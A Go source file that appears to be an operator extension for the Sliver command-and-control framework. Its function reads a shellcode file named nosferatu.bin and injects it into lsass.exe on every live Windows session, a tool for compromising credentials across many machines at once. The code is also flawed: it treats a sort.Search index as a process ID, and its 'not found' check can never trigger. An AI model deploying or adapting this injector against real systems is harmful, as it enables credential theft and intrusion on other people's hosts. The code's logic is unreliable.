package dispatch

import (
	"context"
	"fmt"
	"log"
	"os"
	"sliver-dispatch/utils"
	"sort"
	"strings"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

func Nosferatu(rpc rpcpb.SliverRPCClient, args ...string) {

	if len(args) < 1 {
		fmt.Println("Need the full path to nosferatu.bin")
		return
	}

	b_nosferatu, err := os.ReadFile(args[0])
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}
	var sessions *clientpb.Sessions

	sessions, err = rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}

	var session *clientpb.Session
	var shellcode_task *sliverpb.Task
	var ps_task *sliverpb.Ps
	pid := -1
	for _, session = range sessions.GetSessions() {
		if !session.IsDead && session.OS == "windows" {

			fmt.Println(fmt.Sprintf("==| ID: %-10s | Host: %-20s | Address: %-15s | Username: %-10s |==",
				strings.Split(session.ID, "-")[0],
				session.Hostname,
				strings.Split(session.RemoteAddress, ":")[0],
				session.Username))

			ps_task, err = rpc.Ps(
				context.Background(),
				&sliverpb.PsReq{
					Request: &commonpb.Request{
						Async:     false,
						SessionID: session.ID,
					},
				})

			pid = sort.Search(len(ps_task.Processes), func(i int) bool {
				return ps_task.Processes[i].Executable == "lsass.exe"
			})

			if pid == -1 {
				fmt.Println("Could not find lsass pid!")
				continue
			}

			utils.Dprint("LSASS pid: %d", pid)

			shellcode_task, err = rpc.Task(
				context.Background(),
				&sliverpb.TaskReq{
					Data:     b_nosferatu,
					RWXPages: false,
					Pid:      uint32(pid),
					Request: &commonpb.Request{
						Async:     false,
						SessionID: session.ID,
					},
				})
			if shellcode_task.Response != nil {
				fmt.Println("Error: " + shellcode_task.Response.Err)
			}
		}
	}
}
